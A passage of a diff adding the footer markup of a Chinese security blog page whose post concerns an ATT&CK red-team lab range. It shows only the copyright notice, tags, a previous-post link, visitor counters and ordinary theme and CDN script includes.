+      <a href="https://syst1m.top/2022/07/17/ATT&CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/" title="ATT&amp;CK红队实战靶场01">https://syst1m.top/2022/07/17/ATT&CK红队实战靶场01/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ATT-CK/" rel="tag"># ATT&CK</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/" rel="prev" title="hackable-3打靶">
+                  <i class="fa fa-chevron-left"></i> hackable-3打靶
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Syst1m</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
